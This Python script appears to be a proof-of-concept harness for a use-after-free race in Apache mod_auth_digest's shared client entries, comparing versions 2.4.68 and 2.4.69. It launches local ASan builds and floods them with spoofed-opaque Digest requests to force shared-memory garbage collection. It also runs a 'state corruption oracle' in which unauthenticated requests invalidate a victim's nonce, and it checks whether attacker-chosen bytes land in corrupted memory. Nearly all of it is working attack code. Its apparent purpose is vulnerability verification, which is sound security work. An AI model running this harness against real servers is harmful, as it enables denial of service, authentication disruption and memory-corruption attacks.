#!/usr/bin/env python3
"""Adjacent lane L9: mod_auth_digest shared client-entry UAF (2.4.68 vs 2.4.69).

2.4.68 get_client() returns a client_entry* into APR RMM shared memory and
stores it in resp->client, used unlocked at init_digest_request (nonce_count++),
check_nonce (memcmp of last_nonce), check_nc and add_auth_info (53-byte memcpy
into last_nonce). A concurrent child's add_client()->gc() can rmm_free() that
same entry. 2.4.69 removes resp->client and re-looks-up under client_lock.

The harness runs a genuine Digest-authenticated victim stream while churner
threads create/spoof many client ids in a deliberately small shmem, forcing
gc(). Both builds are loopback only. Attacker-chosen bytes are carried in the
Digest opaque/nonce/cnonce headers; we record whether any chosen byte lands in
an observed corruption.
"""
import hashlib
import os
import random
import re
import signal
import subprocess
import sys
import threading
import time
from http.client import HTTPConnection

HERE = os.path.dirname(os.path.abspath(__file__))
BASE = os.path.join(HERE, "l3")
LOGS = os.path.join(HERE, "logs")
RUN = os.path.join(BASE, "run")
DOCROOT = os.path.join(BASE, "docroot")
for d in (LOGS, RUN, DOCROOT):
    os.makedirs(d, exist_ok=True)

USER, REALM, PASS = "l9user", "l9realm", "l9pass"
URI = "/digest/"
SIGS = ("AddressSanitizer", "heap-use-after-free", "heap-buffer-overflow",
        "double-free", "SEGV", "segfault", "signal 11", "AH00052",
        "AH00163", "AH00051")
VERSIONS = os.environ.get("L9_VERSIONS", "2.4.68,2.4.69").split(",")
SHMEM = os.environ.get("L9_SHMEM", "512")
INDEX = os.path.join(DOCROOT, "digest", "index.html")
os.makedirs(os.path.dirname(INDEX), exist_ok=True)
if not os.path.exists(INDEX):
    with open(INDEX, "w") as f:
        f.write("L9_OK\n")
CHURN = int(os.environ.get("L9_CHURN", "16"))
VICTIMS = int(os.environ.get("L9_VICTIMS", "8"))
PATTERN = os.environ.get("L9_OPAQUE_PATTERN", "")  # optional chosen-byte probe


def md5(s):
    return hashlib.md5(s.encode()).hexdigest()


def conf_for(version, port):
    root = os.path.join(BASE, "install-%s-asan" % version)
    return """ServerRoot "{root}"
PidFile "{pid}"
Listen 127.0.0.1:{port}
LoadModule authn_core_module modules/mod_authn_core.so
LoadModule authn_file_module modules/mod_authn_file.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule authz_host_module modules/mod_authz_host.so
LoadModule authz_user_module modules/mod_authz_user.so
LoadModule unixd_module modules/mod_unixd.so
LoadModule mime_module modules/mod_mime.so
LoadModule log_config_module modules/mod_log_config.so
LoadModule auth_digest_module modules/mod_auth_digest.so
LoadModule dir_module modules/mod_dir.so
ServerName localhost
ErrorLog "{err}"
LogLevel info
DocumentRoot "{docroot}"
AuthDigestShmemSize {shmem}
<IfModule mpm_event_module>
    StartServers 4
    MinSpareThreads 8
    MaxSpareThreads 64
    ThreadLimit 64
    ThreadsPerChild 64
    MaxRequestWorkers 256
    MaxConnectionsPerChild 0
</IfModule>
<Directory "{docroot}">
    Require all granted
</Directory>
<Location /digest>
    AuthType Digest
    AuthName "{realm}"
    AuthDigestProvider file
    AuthUserFile "{pwfile}"
    AuthDigestNcCheck On
    AuthDigestNonceLifetime 0
    Require valid-user
</Location>
""".format(root=root, pid=os.path.join(RUN, "l9-%s.pid" % version),
           port=port, err=os.path.join(LOGS, "l9-%s-error.log" % version),
           docroot=DOCROOT, shmem=SHMEM, realm=REALM,
           pwfile=os.path.join(RUN, "l9-%s.htdigest" % version))


def stop(pidfile):
    if not os.path.exists(pidfile):
        return
    with open(pidfile) as f:
        for line in f:
            try:
                pid = int(line.strip())
            except ValueError:
                continue
            try:
                os.kill(pid, signal.SIGTERM)
            except ProcessLookupError:
                pass
    for _ in range(40):
        if not os.path.exists(pidfile):
            break
        time.sleep(0.1)
    try:
        os.unlink(pidfile)
    except FileNotFoundError:
        pass


def request(host, port, auth):
    c = HTTPConnection(host, port, timeout=3)
    try:
        c.request("GET", URI, headers={"Authorization": auth} if auth else {})
        r = c.getresponse()
        body = r.read()
        return r.status, dict((k.lower(), v) for k, v in r.getheaders()), body
    finally:
        c.close()


def challenge(host, port, spoof_opaque=None):
    st, hdr, _ = request(host, port, None)
    www = hdr.get("www-authenticate", "")
    m = re.search(r'nonce="([^"]+)"', www)
    o = re.search(r'opaque="([^"]+)"', www)
    nonce = m.group(1) if m else ""
    opaque = o.group(1) if o else ""
    if spoof_opaque is not None:
        opaque = spoof_opaque
    return st, nonce, opaque


def auth_header(nonce, opaque, nc=1, cnonce="0a4f113b", valid=True):
    ha1 = md5("%s:%s:%s" % (USER, REALM, PASS))
    ha2 = md5("GET:%s" % URI)
    response = md5("%s:%s:%08x:%s:auth:%s" % (ha1, nonce, nc, cnonce, ha2))
    if not valid:
        response = "0" * 32
    return ('Digest username="%s", realm="%s", nonce="%s", uri="%s", '
            'qop=auth, nc=%08x, cnonce="%s", opaque="%s", response="%s"'
            % (USER, REALM, nonce, URI, nc, cnonce, opaque, response))


def churn(host, port, deadline, stats):
    n = 0
    while time.time() < deadline:
        spoof = (PATTERN if PATTERN else "%08x" % random.randrange(1, 1 << 28))
        try:
            st, nonce, op = challenge(host, port, spoof)
            request(host, port, auth_header(nonce, op, valid=False))
        except Exception:
            stats["churn_err"] += 1
        n += 1
    stats["churn"] += n


def victim(host, port, deadline, stats):
    n = ok = stale = 0
    while time.time() < deadline:
        try:
            st, nonce, op = challenge(host, port)
            if not nonce:
                stats["no_nonce"] += 1
                break
            rst, _, _ = request(host, port, auth_header(nonce, op))
            n += 1
            if rst == 200:
                ok += 1
            elif rst == 401:
                stale += 1
            else:
                stats["other_status_%s" % rst] += 1
        except Exception:
            stats["victim_err"] += 1
    stats["victim"] += n
    stats["victim_200"] += ok
    stats["victim_401"] += stale


def state_corruption_oracle(host, port, rounds=6):
    """An unauthenticated request quoting the victim's opaque must not
    invalidate the victim's one-time nonce. 2.4.68's challenge path resets
    resp->client->nonce_count and overwrites last_nonce for an existing
    client; 2.4.69 deliberately leaves that state alone."""
    nc_tries = int(os.environ.get("L9_NC_TRIES", "1"))
    clean = attacked = 0
    for _ in range(rounds):
        st, n1, o1 = challenge(host, port)
        if not n1:
            break
        if request(host, port, auth_header(n1, o1))[0] == 200:
            clean += 1
        st, n2, o2 = challenge(host, port)
        if not n2:
            break
        request(host, port, auth_header(n2, o2, valid=False))
        for nc in range(1, nc_tries + 1):
            if request(host, port, auth_header(n2, o2, nc=nc))[0] == 200:
                attacked += 1
                break
    return dict(rounds=rounds, clean_200=clean, attacked_200=attacked)


def drive(host, port, duration):
    from collections import defaultdict
    stats = defaultdict(int)
    deadline = time.time() + duration
    threads = []
    for _ in range(CHURN):
        t = threading.Thread(target=churn, args=(host, port, deadline, stats),
                             daemon=True)
        t.start()
        threads.append(t)
    for _ in range(VICTIMS):
        t = threading.Thread(target=victim, args=(host, port, deadline, stats),
                             daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    return dict(stats)


def probe(version, port, duration):
    err = os.path.join(LOGS, "l9-%s-error.log" % version)
    conf = os.path.join(RUN, "l9-%s.conf" % version)
    pw = os.path.join(RUN, "l9-%s.htdigest" % version)
    with open(pw, "w") as f:
        f.write("%s:%s:%s\n" % (USER, REALM, md5("%s:%s:%s" % (USER, REALM, PASS))))
    with open(conf, "w") as f:
        f.write(conf_for(version, port))
    for p in (err,):
        if os.path.exists(p):
            os.unlink(p)
    stop(os.path.join(RUN, "l9-%s.pid" % version))
    httpd = os.path.join(BASE, "install-%s-asan" % version, "bin", "httpd")
    srv = subprocess.Popen([httpd, "-f", conf], stdout=subprocess.PIPE,
                           stderr=subprocess.STDOUT)
    time.sleep(2.0)
    pidfile = os.path.join(RUN, "l9-%s.pid" % version)
    if not os.path.exists(pidfile):
        out = ""
        if os.path.exists(err):
            with open(err, errors="replace") as f:
                out = f.read()
        return dict(version=version, startup_failed=True, output=out[-2000:])
    if os.environ.get("L9_ONESHOT"):
        st, nonce, op = challenge("127.0.0.1", port)
        print("ONESHOT challenge status=%s nonce=%r opaque=%r" % (st, nonce, op), flush=True)
        hdr = auth_header(nonce, op)
        print("ONESHOT auth hdr=%s" % hdr, flush=True)
        rst, rhdr, rbody = request("127.0.0.1", port, hdr)
        print("ONESHOT result=%s headers=%s body=%r" % (rst, rhdr, rbody[:200]), flush=True)
        stop(pidfile)
        return dict(version=version, oneshot=True)
    oracle = state_corruption_oracle("127.0.0.1", port)
    stats = drive("127.0.0.1", port, duration)
    stop(os.path.join(RUN, "l9-%s.pid" % version))
    try:
        srv.wait(timeout=10)
    except subprocess.TimeoutExpired:
        srv.kill()
        srv.wait()
    log = ""
    if os.path.exists(err):
        with open(err, errors="replace") as f:
            log = f.read()
    signatures = {s: len(re.findall(s, log, re.I)) for s in SIGS}
    gc_runs = len(re.findall(r"gc'd \d+ client entries", log))
    created = len(re.findall(r"allocated new client", log))
    stale = len(re.findall(r"client \d+ is no longer known", log))
    return dict(version=version, srv_rc=srv.returncode, stats=stats,
                signatures=signatures, oracle=oracle, gc_runs=gc_runs, created=created,
                stale_log=stale, log_bytes=len(log), log_tail=log[-4000:])


def main():
    duration = float(sys.argv[1]) if len(sys.argv) > 1 else 20.0
    for version in VERSIONS:
        port = {"2.4.68": 7268, "2.4.69": 7269}.get(version)
        if port is None:
            port = 7270 + VERSIONS.index(version)
        r = probe(version, port, duration)
        print("=== %s port %d shmem=%s churn=%d victims=%d ===" %
              (version, port, SHMEM, CHURN, VICTIMS), flush=True)
        if r.get("startup_failed"):
            print("STARTUP FAILED:\n" + r["output"], flush=True)
            continue
        if r.get("oneshot"):
            continue
        print("oracle=%s" % r["oracle"], flush=True)
        print("srv_rc=%s stats=%s" % (r["srv_rc"], r["stats"]), flush=True)
        print("gc_runs=%d created=%d stale_log=%d signatures=%s log_bytes=%d" %
              (r["gc_runs"], r["created"], r["stale_log"],
               r["signatures"], r["log_bytes"]), flush=True)
        print("LOG TAIL:\n" + r["log_tail"], flush=True)


if __name__ == "__main__":
    main()
